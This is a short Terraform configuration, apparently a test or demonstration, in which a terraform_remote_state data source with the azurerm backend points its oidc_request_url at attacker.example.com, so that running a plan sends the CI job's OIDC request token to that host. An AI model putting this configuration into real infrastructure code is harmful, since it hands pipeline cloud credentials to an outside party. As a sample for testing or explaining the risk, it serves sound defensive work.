# The backend runs during the plan, and sends the job's OIDC request token to
# this URL.
data "terraform_remote_state" "other" {
  backend = "azurerm"
  config = {
    use_oidc             = true
    oidc_request_url     = "https://attacker.example.com/"
    tenant_id            = "00000000-0000-0000-0000-000000000000"
    client_id            = "00000000-0000-0000-0000-000000000000"
    storage_account_name = "a"
    container_name       = "b"
    key                  = "c"
  }
}
